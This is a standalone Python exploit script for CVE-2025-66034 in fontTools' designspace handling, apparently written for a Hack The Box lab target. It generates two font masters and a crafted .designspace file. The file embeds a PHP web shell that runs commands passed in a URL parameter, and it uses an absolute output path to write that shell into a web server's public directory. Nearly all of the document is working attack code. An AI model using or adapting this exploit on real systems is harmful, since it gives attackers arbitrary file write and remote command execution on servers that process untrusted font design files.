#!/usr/bin/env python3
# CVE-2025-66034 — fontTools varLib designspace: arbitrary file write + content injection.
# Builds two interpolatable masters and a malicious .designspace whose <labelname> carries
# a PHP payload (written verbatim into the output font's Mac name record) and whose
# <variable-font filename="..."> uses an absolute path to drop the result into the webroot.
import sys
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

OUT_PATH = sys.argv[1] if len(sys.argv) > 1 else "/var/www/portal.variatype.htb/public/files/shell.php"
PHP = "<?php @ob_clean(); system($_GET['c']); die(); ?>"

def make_master(path, wght):
    glyphs = [".notdef", "A", "space"]
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder(glyphs)
    fb.setupCharacterMap({0x41: "A", 0x20: "space"})
    pen = TTGlyphPen(None)
    pen.moveTo((100, 0)); pen.lineTo((100, 700)); pen.lineTo((500, 700)); pen.lineTo((500, 0)); pen.closePath()
    box = pen.glyph()
    empty = TTGlyphPen(None).glyph()
    fb.setupGlyf({".notdef": empty, "A": box, "space": empty})
    metrics = {g: (600, 50) for g in glyphs}
    fb.setupHorizontalMetrics(metrics)
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({"familyName": "Source", "styleName": "Regular"})
    fb.setupOS2(sTypoAscender=800, usWinAscent=800, usWinDescent=200)
    fb.setupPost()
    fb.font["head"].unitsPerEm = 1000
    fb.save(path)
    print(f"[+] master {path} (wght={wght})")

make_master("source-regular.ttf", 400)
make_master("source-black.ttf", 900)

designspace = f"""<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="400" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[{PHP}]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-regular.ttf" name="Source Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
    <source filename="source-black.ttf" name="Source Black">
      <location><dimension name="Weight" xvalue="900"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="Variabype" filename="{OUT_PATH}">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
"""
with open("config.designspace", "w") as f:
    f.write(designspace)
print(f"[+] config.designspace (output -> {OUT_PATH})")
